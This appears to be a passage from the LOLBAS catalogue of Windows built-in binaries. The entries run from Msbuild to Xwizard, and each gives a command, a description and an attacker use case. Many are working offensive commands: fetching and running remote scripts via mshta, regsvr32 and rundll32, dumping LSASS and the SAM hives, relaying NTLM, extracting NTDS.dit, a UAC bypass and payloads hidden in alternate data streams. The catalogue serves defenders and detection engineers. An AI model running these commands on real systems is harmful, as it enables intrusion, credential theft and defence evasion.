+Description : Execute JScript/VBScript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.
+Usecase : Execute project file that contains XslTransformation tag parameters
+                               
+Name : Msbuild.exe
+Command : msbuild.exe @{PATH:.rsp}
+Description : By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.
+Usecase : Bypass command-line based detections
+                               
+Name : Msconfig.exe
+Command : Msconfig.exe -5
+Description : Executes command embeded in crafted c:\windows\system32\mscfgtlc.xml.
+Usecase : Code execution using Msconfig.exe
+                               
+Name : Msdt.exe
+Command : msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+Description : Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
+Usecase : Execute code
+                               
+Name : Msdt.exe
+Command : msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
+Description : Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
+Usecase : Execute code bypass Application whitelisting
+                               
+Name : Msdt.exe
+Command : msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
+Description : Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.
+Usecase : Execute code bypass Application allowlisting
+                               
+Name : Msedge.exe
+Command : msedge.exe {REMOTEURL:.exe.txt}
+Description : Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.
+Usecase : Download file from the internet
+                               
+Name : Msedge.exe
+Command : msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
+Description : Edge will silently download the file. File extension should be .html and binaries should be encoded.
+Usecase : Download file from the internet
+                               
+Name : Msedge.exe
+Command : msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+Description : Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command
+Usecase : Executes a process under a trusted Microsoft signed binary
+                               
+Name : Mshta.exe
+Command : mshta.exe {PATH:.hta}
+Description : Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+Usecase : Execute code
+                               
+Name : Mshta.exe
+Command : mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
+Description : Executes VBScript supplied as a command line argument.
+Usecase : Execute code
+                               
+Name : Mshta.exe
+Command : mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
+Description : Executes JavaScript supplied as a command line argument.
+Usecase : Execute code
+                               
+Name : Mshta.exe
+Command : mshta.exe "{PATH_ABSOLUTE}:file.hta"
+Description : Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+Usecase : Execute code hidden in alternate data stream
+                               
+Name : Mshta.exe
+Command : mshta.exe {REMOTEURL}
+Description : It will download a remote payload and place it in INetCache.
+Usecase : Downloads payload from remote server
+                               
+Name : Msiexec.exe
+Command : msiexec /quiet /i {PATH:.msi}
+Description : Installs the target .MSI file silently.
+Usecase : Execute custom made msi file with attack code
+                               
+Name : Msiexec.exe
+Command : msiexec /q /i {REMOTEURL}
+Description : Installs the target remote & renamed .MSI file silently.
+Usecase : Execute custom made msi file with attack code from remote server
+                               
+Name : Msiexec.exe
+Command : msiexec /y {PATH_ABSOLUTE:.dll}
+Description : Calls DllRegisterServer to register the target DLL.
+Usecase : Execute dll files
+                               
+Name : Msiexec.exe
+Command : msiexec /z {PATH_ABSOLUTE:.dll}
+Description : Calls DllUnregisterServer to un-register the target DLL.
+Usecase : Execute dll files
+                               
+Name : Msiexec.exe
+Command : msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS="{REMOTEURL:.mst}" /qb
+Description : Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.
+Usecase : Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
+                               
+Name : Netsh.exe
+Command : netsh.exe add helper {PATH_ABSOLUTE:.dll}
+Description : Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called
+Usecase : Proxy execution of .dll
+                               
+Name : Ngen.exe
+Command : ngen.exe {REMOTEURL}
+Description : Downloads payload from remote server using the Microsoft Native Image Generator utility.
+Usecase : It will download a remote payload and place it in INetCache.
+                               
+Name : Odbcconf.exe
+Command : odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}
+Description : Execute DllRegisterServer from DLL specified.
+Usecase : Execute a DLL file using technique that can evade defensive counter measures
+                               
+Name : Odbcconf.exe
+Command : odbcconf INSTALLDRIVER "lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"
+odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"
+
+Description : Install a driver and load the DLL. Requires administrator privileges.
+Usecase : Execute dll file using technique that can evade defensive counter measures
+                               
+Name : Odbcconf.exe
+Command : odbcconf -f {PATH:.rsp}
+Description : Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.
+Usecase : Execute dll file using technique that can evade defensive counter measures
+                               
+Name : OfflineScannerShell.exe
+Command : OfflineScannerShell
+Description : Execute mpclient.dll library in the current working directory
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : OneDriveStandaloneUpdater.exe
+Command : OneDriveStandaloneUpdater
+Description : Download a file from the web address specified in `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC`. `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be equal to non-empty string values in that same registry key. `UpdateOfficeConfigTimestamp` is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in `%localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json`.
+Usecase : Download a file from the Internet without executing any anomalous executables with suspicious arguments
+                               
+Name : Pcalua.exe
+Command : pcalua.exe -a {PATH:.exe}
+Description : Open the target .EXE using the Program Compatibility Assistant.
+Usecase : Proxy execution of binary
+                               
+Name : Pcalua.exe
+Command : pcalua.exe -a {PATH_SMB:.dll}
+Description : Open the target .DLL file with the Program Compatibilty Assistant.
+Usecase : Proxy execution of remote dll file
+                               
+Name : Pcalua.exe
+Command : pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java
+Description : Open the target .CPL file with the Program Compatibility Assistant.
+Usecase : Execution of CPL files
+                               
+Name : Pcwrun.exe
+Command : Pcwrun.exe {PATH_ABSOLUTE:.exe}
+Description : Open the target .EXE file with the Program Compatibility Wizard.
+Usecase : Proxy execution of binary
+                               
+Name : Pcwrun.exe
+Command : Pcwrun.exe /../../$(calc).exe
+Description : Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.
+Usecase : Proxy execution of binary
+                               
+Name : Pktmon.exe
+Command : pktmon.exe start --etw
+Description : Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop
+Usecase : use this a built in network sniffer on windows 10 to capture senstive traffic
+                               
+Name : Pktmon.exe
+Command : pktmon.exe filter add -p 445
+Description : Select Desired ports for packet capture
+Usecase : Look for interesting traffic such as telent or FTP
+                               
+Name : Pnputil.exe
+Command : pnputil.exe -i -a {PATH_ABSOLUTE:.inf}
+Description : Used for installing drivers
+Usecase : Add malicious driver
+                               
+Name : Presentationhost.exe
+Command : Presentationhost.exe {PATH_ABSOLUTE:.xbap}
+Description : Executes the target XAML Browser Application (XBAP) file
+Usecase : Execute code within XBAP files
+                               
+Name : Presentationhost.exe
+Command : Presentationhost.exe {REMOTEURL}
+Description : It will download a remote payload and place it in INetCache.
+Usecase : Downloads payload from remote server
+                               
+Name : Print.exe
+Command : print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
+Description : Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
+Usecase : Hide binary file in alternate data stream to potentially bypass defensive counter measures
+                               
+Name : Print.exe
+Command : print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
+Description : Copy file from source to destination
+Usecase : Copy files
+                               
+Name : Print.exe
+Command : print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
+Description : Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
+Usecase : Copy/Download file from remote server
+                               
+Name : PrintBrm.exe
+Command : PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
+Description : Create a ZIP file from a folder in a remote drive
+Usecase : Exfiltrate the contents of a remote folder on a UNC share into a zip file
+                               
+Name : PrintBrm.exe
+Command : PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
+Description : Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder
+Usecase : Decompress and extract a ZIP file stored on an alternate data stream to a new folder
+                               
+Name : Provlaunch.exe
+Command : provlaunch.exe LOLBin
+Description : Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.
+Usecase : Executes arbitrary command
+                               
+Name : Psr.exe
+Command : psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0
+Description : Record a user screen without creating a GUI. You should use "psr.exe /stop" to stop recording and create output file.
+Usecase : Can be used to take screenshots of the user environment
+                               
+Name : Query.exe
+Command : query.exe user
+Description : Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if `query.exe` is copied to a folder and an arbitrary executable is renamed to `quser.exe`, `query.exe` will spawn it. Instead of `user`, it is also possible to use `session`, `termsession` or `process` as command-line option.
+Usecase : Execute an arbitrary executable via trusted system executable.
+                               
+Name : Rasautou.exe
+Command : rasautou -d {PATH:.dll} -p export_name -a a -e e
+Description : Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.
+Usecase : Execute DLL code
+                               
+Name : rdrleakdiag.exe
+Command : rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
+Description : Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
+Usecase : Dump process by PID.
+                               
+Name : rdrleakdiag.exe
+Command : rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
+Description : Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
+Usecase : Dump LSASS process.
+                               
+Name : rdrleakdiag.exe
+Command : rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap
+Description : After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
+Usecase : Dump LSASS process mutliple times.
+                               
+Name : Reg.exe
+Command : reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
+Description : Export the target Registry key and save it to the specified .REG file within an Alternate data stream.
+Usecase : Hide/plant registry information in Alternate data stream for later use
+                               
+Name : Reg.exe
+Command : reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
+Description : Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material
+Usecase : Dump credentials from the Security Account Manager (SAM)
+                               
+Name : Regasm.exe
+Command : regasm.exe {PATH:.dll}
+Description : Loads the target .NET DLL file and executes the RegisterClass function.
+Usecase : Execute code and bypass Application whitelisting
+                               
+Name : Regasm.exe
+Command : regasm.exe /U {PATH:.dll}
+Description : Loads the target .DLL file and executes the UnRegisterClass function.
+Usecase : Execute code and bypass Application whitelisting
+                               
+Name : Regedit.exe
+Command : regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+Description : Export the target Registry key to the specified .REG file.
+Usecase : Hide registry data in alternate data stream
+                               
+Name : Regedit.exe
+Command : regedit {PATH_ABSOLUTE}:regfile.reg
+Description : Import the target .REG file into the Registry.
+Usecase : Import hidden registry data from alternate data stream
+                               
+Name : Regini.exe
+Command : regini.exe {PATH}:hidden.ini
+Description : Write registry keys from data inside the Alternate data stream.
+Usecase : Write to registry
+                               
+Name : Register-cimprovider.exe
+Command : Register-cimprovider -path {PATH_ABSOLUTE:.dll}
+Description : Load the target .DLL.
+Usecase : Execute code within dll file
+                               
+Name : Regsvcs.exe
+Command : regsvcs.exe {PATH:.dll}
+Description : Loads the target .NET DLL file and executes the RegisterClass function.
+Usecase : Execute dll file and bypass Application whitelisting
+                               
+Name : Regsvcs.exe
+Command : regsvcs.exe {PATH:.dll}
+Description : Loads the target .NET DLL file and executes the RegisterClass function.
+Usecase : Execute dll file and bypass Application whitelisting
+                               
+Name : Regsvr32.exe
+Command : regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+Description : Execute the specified remote .SCT script with scrobj.dll.
+Usecase : Execute code from remote scriptlet, bypass Application whitelisting
+                               
+Name : Regsvr32.exe
+Command : regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+Description : Execute the specified local .SCT script with scrobj.dll.
+Usecase : Execute code from scriptlet, bypass Application whitelisting
+                               
+Name : Regsvr32.exe
+Command : regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
+Description : Execute the specified remote .SCT script with scrobj.dll.
+Usecase : Execute code from remote scriptlet, bypass Application whitelisting
+                               
+Name : Regsvr32.exe
+Command : regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
+Description : Execute the specified local .SCT script with scrobj.dll.
+Usecase : Execute code from scriptlet, bypass Application whitelisting
+                               
+Name : Regsvr32.exe
+Command : regsvr32.exe /s {PATH:.dll}
+Description : Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.
+Usecase : Execute DLL file
+                               
+Name : Regsvr32.exe
+Command : regsvr32.exe /u /s {PATH:.dll}
+Description : Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.
+Usecase : Execute DLL file
+                               
+Name : Replace.exe
+Command : replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A
+Description : Copy .cab file to destination
+Usecase : Copy files
+                               
+Name : Replace.exe
+Command : replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A
+Description : Download/Copy executable to specified folder
+Usecase : Download file
+                               
+Name : Reset.exe
+Command : reset.exe session
+Description : Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, if `reset.exe` is copied to a folder and an arbitrary executable is renamed to `rwinsta.exe`, `reset.exe` will spawn it.
+Usecase : Execute an arbitrary executable via trusted system executable.
+                               
+Name : Rpcping.exe
+Command : rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
+Description : Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
+Usecase : Capture credentials on a non-standard port
+                               
+Name : Rpcping.exe
+Command : rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
+Description : Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).
+Usecase : Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
+                               
+Name : Rundll32.exe
+Command : rundll32.exe {PATH},EntryPoint
+Description : First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.
+Usecase : Execute DLL file
+                               
+Name : Rundll32.exe
+Command : rundll32.exe {PATH_SMB:.dll},EntryPoint
+Description : Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.
+Usecase : Execute DLL from SMB share.
+                               
+Name : Rundll32.exe
+Command : rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:{REMOTEURL}")
+Description : Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
+Usecase : Execute code from Internet
+                               
+Name : Rundll32.exe
+Command : rundll32 "{PATH}:ADSDLL.dll",DllMain
+Description : Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).
+Usecase : Execute code from alternate data stream
+                               
+Name : Rundll32.exe
+Command : rundll32.exe -sta {CLSID}
+Description : Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.
+Usecase : Execute a DLL/EXE COM server payload or ScriptletURL code.
+                               
+Name : Runexehelper.exe
+Command : runexehelper.exe {PATH_ABSOLUTE:.exe}
+Description : Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.
+Usecase : Executes arbitrary code
+                               
+Name : Runonce.exe
+Command : Runonce.exe /AlternateShellStartup
+Description : Executes a Run Once Task that has been configured in the registry.
+Usecase : Persistence, bypassing defensive counter measures
+                               
+Name : Runscripthelper.exe
+Command : runscripthelper.exe surfacecheck \\?\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}
+Description : Execute the PowerShell script with .txt extension
+Usecase : Bypass constrained language mode and execute Powershell script
+                               
+Name : Sc.exe
+Command : sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
+Description : Creates a new service and executes the file stored in the ADS.
+Usecase : Execute binary file hidden inside an alternate data stream
+                               
+Name : Sc.exe
+Command : sc config {ExistingServiceName} binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start {ExistingServiceName}
+Description : Modifies an existing service and executes the file stored in the ADS.
+Usecase : Execute binary file hidden inside an alternate data stream
+                               
+Name : Schtasks.exe
+Command : schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "{CMD}"
+Description : Create a recurring task to execute every minute.
+Usecase : Create a recurring task to keep reverse shell session(s) alive
+                               
+Name : Schtasks.exe
+Command : schtasks /create /s targetmachine /tn "MyTask" /tr "{CMD}" /sc daily
+Description : Create a scheduled task on a remote computer for persistence/lateral movement
+Usecase : Create a remote task to run daily relative to the the time of creation
+                               
+Name : Scriptrunner.exe
+Command : Scriptrunner.exe -appvscript {PATH:.exe}
+Description : Executes executable
+Usecase : Execute binary through proxy binary to evade defensive counter measures
+                               
+Name : Scriptrunner.exe
+Command : ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
+Description : Executes cmd file from remote server
+Usecase : Execute binary through proxy binary from external server to evade defensive counter measures
+                               
+Name : Setres.exe
+Command : setres.exe -w 800 -h 600
+Description : Sets the resolution and then launches 'choice' command from the working directory.
+Usecase : Executes arbitrary code
+                               
+Name : SettingSyncHost.exe
+Command : SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}
+Description : Execute file specified in %COMSPEC%
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : SettingSyncHost.exe
+Command : SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}
+Description : Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.
+                               
+Name : Sftp.exe
+Command : sftp -o ProxyCommand="{CMD}" .
+Description : Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.
+Usecase : Proxy execution of specified command, can be used as a defensive evasion.
+                               
+Name : ssh.exe
+Command : ssh localhost "{CMD}"
+Description : Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.
+Usecase : Execute specified command, can be used for defense evasion.
+                               
+Name : ssh.exe
+Command : ssh -o ProxyCommand="{CMD}" .
+Description : Executes specified command from ssh.exe
+Usecase : Performs execution of specified file, can be used as a defensive evasion.
+                               
+Name : Stordiag.exe
+Command : stordiag.exe
+Description : Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.
+Usecase : Possible defence evasion purposes.
+                               
+Name : Stordiag.exe
+Command : stordiag.exe
+Description : Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.
+Usecase : Possible defence evasion purposes.
+                               
+Name : SyncAppvPublishingServer.exe
+Command : SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+Description : Example command on how inject Powershell code into the process
+Usecase : Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
+                               
+Name : Tar.exe
+Command : tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}
+Description : Compress one or more files to an alternate data stream (ADS).
+Usecase : Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism
+                               
+Name : Tar.exe
+Command : tar -xf {PATH}:ads
+Description : Decompress a compressed file from an alternate data stream (ADS).
+Usecase : Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism
+                               
+Name : Tar.exe
+Command : tar -xf {PATH_SMB:.tar}
+Description : Extracts archive.tar from the remote (internal) host to the current host.
+Usecase : Copy files
+                               
+Name : Ttdinject.exe
+Command : TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "{PATH:.exe}"
+Description : Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.
+Usecase : Spawn process using other binary
+                               
+Name : Ttdinject.exe
+Command : ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "{PATH:.exe}"
+Description : Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.
+Usecase : Spawn process using other binary
+                               
+Name : Tttracer.exe
+Command : tttracer.exe {PATH_ABSOLUTE:.exe}
+Description : Execute specified executable from tttracer.exe. Requires administrator privileges.
+Usecase : Spawn process using other binary
+                               
+Name : Tttracer.exe
+Command : TTTracer.exe -dumpFull -attach {PID}
+Description : Dumps process using tttracer.exe. Requires administrator privileges
+Usecase : Dump process by PID
+                               
+Name : Unregmp2.exe
+Command : rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
+Description : Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.
+Usecase : Proxy execution of binary
+                               
+Name : vbc.exe
+Command : vbc.exe /target:exe {PATH_ABSOLUTE:.vb}
+Description : Binary file used by .NET to compile Visual Basic code to an executable.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : vbc.exe
+Command : vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}
+Description : Binary file used by .NET to compile Visual Basic code to an executable.
+Usecase : Compile attacker code on system. Bypass defensive counter measures.
+                               
+Name : Verclsid.exe
+Command : verclsid.exe /S /C {CLSID}
+Description : Used to verify a COM object before it is instantiated by Windows Explorer
+Usecase : Run a COM object created in registry to evade defensive counter measures
+                               
+Name : Wab.exe
+Command : wab.exe
+Description : Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice
+Usecase : Execute dll file. Bypass defensive counter measures
+                               
+Name : wbadmin.exe
+Command : wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
+Description : Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)
+Usecase : Snapshoting of Active Directory NTDS.dit database
+                               
+Name : wbadmin.exe
+Command : wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+Description : Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.
+Usecase : Dumping of Active Directory NTDS.dit database
+                               
+Name : wbemtest.exe
+Command : wbemtest.exe
+Description : Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources.
+Usecase : Execute arbitrary commands through WMI classes
+                               
+Name : winget.exe
+Command : winget.exe install --manifest {PATH:.yml}
+Description : Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`
+Usecase : Download and execute an arbitrary file from the internet
+                               
+Name : winget.exe
+Command : winget.exe install --accept-package-agreements -s msstore {name or ID}
+Description : Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.
+Usecase : Download and install software from Microsoft Store, even if Microsoft Store App is blocked
+                               
+Name : winget.exe
+Command : winget.exe install --accept-package-agreements -s msstore {name or ID}
+Description : Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.
+Usecase : Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine
+                               
+Name : Wlrmdr.exe
+Command : wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}
+Description : Execute executable with wlrmdr.exe as parent process
+Usecase : Use wlrmdr as a proxy binary to evade defensive countermeasures
+                               
+Name : Wmic.exe
+Command : wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
+Description : Execute a .EXE file stored as an Alternate Data Stream (ADS)
+Usecase : Execute binary file hidden in Alternate data streams to evade defensive counter measures
+                               
+Name : Wmic.exe
+Command : wmic.exe process call create "{CMD}"
+Description : Execute calc from wmic
+Usecase : Execute binary from wmic to evade defensive counter measures
+                               
+Name : Wmic.exe
+Command : wmic.exe /node:"192.168.0.1" process call create "{CMD}"
+Description : Execute evil.exe on the remote system.
+Usecase : Execute binary on a remote system
+                               
+Name : Wmic.exe
+Command : wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
+Description : Create a volume shadow copy of NTDS.dit that can be copied.
+Usecase : Execute binary on remote system
+                               
+Name : Wmic.exe
+Command : wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
+Description : Executes JScript or VBScript embedded in the target remote XSL stylsheet.
+Usecase : Execute script from remote system
+                               
+Name : Wmic.exe
+Command : wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
+Description : Copy file from source to destination.
+Usecase : Copy file.
+                               
+Name : WorkFolders.exe
+Command : WorkFolders
+Description : Execute control.exe in the current working directory
+Usecase : Can be used to evade defensive countermeasures or to hide as a persistence mechanism
+                               
+Name : Wscript.exe
+Command : wscript //e:vbscript {PATH}:script.vbs
+Description : Execute script stored in an alternate data stream
+Usecase : Execute hidden code to evade defensive counter measures
+                               
+Name : Wscript.exe
+Command : echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+Description : Download and execute script stored in an alternate data stream
+Usecase : Execute hidden code to evade defensive counter measures
+                               
+Name : Wsreset.exe
+Command : wsreset.exe
+Description : During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.
+Usecase : Execute a binary or script as a high-integrity process without a UAC prompt.
+                               
+Name : wuauclt.exe
+Command : wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer
+Description : Loads and executes DLL code on attach.
+Usecase : Execute dll via attach/detach methods
+                               
+Name : Xwizard.exe
+Command : xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+Description : Xwizard.exe running a custom class that has been added to the registry.
+Usecase : Run a com object created in registry to evade defensive counter measures
+                               
+Name : Xwizard.exe
+Command : xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+Description : Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.
+Usecase : Run a com object created in registry to evade defensive counter measures
+                               
+Name : Xwizard.exe
+Command : xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
+Description : Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.
+Usecase : Download file from Internet
+                               
